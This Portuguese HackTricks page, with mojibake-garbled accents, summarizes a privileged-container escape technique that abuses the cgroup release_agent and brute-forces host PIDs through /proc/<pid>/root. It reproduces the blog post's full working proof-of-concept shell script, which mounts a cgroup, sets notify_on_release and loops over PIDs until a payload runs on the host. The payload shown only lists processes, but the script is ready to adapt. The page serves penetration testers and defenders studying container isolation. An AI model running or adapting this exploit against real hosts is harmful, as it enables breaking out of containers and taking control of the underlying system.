<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

Para mais detalhes **verifique a postagem do blog em [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**. Este √© apenas um resumo:

A t√©cnica descreve um m√©todo para **executar c√≥digo do host de dentro de um cont√™iner**, superando desafios impostos por configura√ß√µes de driver de armazenamento que obscurecem o caminho do sistema de arquivos do cont√™iner no host, como Kata Containers ou configura√ß√µes espec√≠ficas do `devicemapper`.

Passos-chave:

1. **Localizando IDs de Processo (PIDs):** Usando o link simb√≥lico `/proc/<pid>/root` no pseudo-sistema de arquivos do Linux, qualquer arquivo dentro do cont√™iner pode ser acessado em rela√ß√£o ao sistema de arquivos do host. Isso contorna a necessidade de conhecer o caminho do sistema de arquivos do cont√™iner no host.
2. **PID Bashing:** Uma abordagem de for√ßa bruta √© empregada para pesquisar atrav√©s dos PIDs no host. Isso √© feito verificando sequencialmente a presen√ßa de um arquivo espec√≠fico em `/proc/<pid>/root/<file>`. Quando o arquivo √© encontrado, indica que o PID correspondente pertence a um processo em execu√ß√£o dentro do cont√™iner alvo.
3. **Desencadeando a Execu√ß√£o:** O caminho PID adivinhado √© escrito no arquivo `cgroups release_agent`. Essa a√ß√£o desencadeia a execu√ß√£o do `release_agent`. O sucesso deste passo √© confirmado verificando a cria√ß√£o de um arquivo de sa√≠da.

### Processo de Explora√ß√£o

O processo de explora√ß√£o envolve um conjunto mais detalhado de a√ß√µes, com o objetivo de executar um payload no host adivinhando o PID correto de um processo em execu√ß√£o dentro do cont√™iner. Veja como isso se desenrola:

1. **Inicializar Ambiente:** Um script de payload (`payload.sh`) √© preparado no host, e um diret√≥rio √∫nico √© criado para manipula√ß√£o do cgroup.
2. **Preparar Payload:** O script de payload, que cont√©m os comandos a serem executados no host, √© escrito e torna-se execut√°vel.
3. **Configurar Cgroup:** O cgroup √© montado e configurado. A flag `notify_on_release` √© definida para garantir que o payload seja executado quando o cgroup for liberado.
4. **For√ßa Bruta PID:** Um loop itera atrav√©s de PIDs potenciais, escrevendo cada PID adivinhado no arquivo `release_agent`. Isso efetivamente define o script de payload como o `release_agent`.
5. **Desencadear e Verificar Execu√ß√£o:** Para cada PID, o `cgroup.procs` √© escrito, desencadeando a execu√ß√£o do `release_agent` se o PID estiver correto. O loop continua at√© que a sa√≠da do script de payload seja encontrada, indicando uma execu√ß√£o bem-sucedida.


PoC da postagem do blog:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
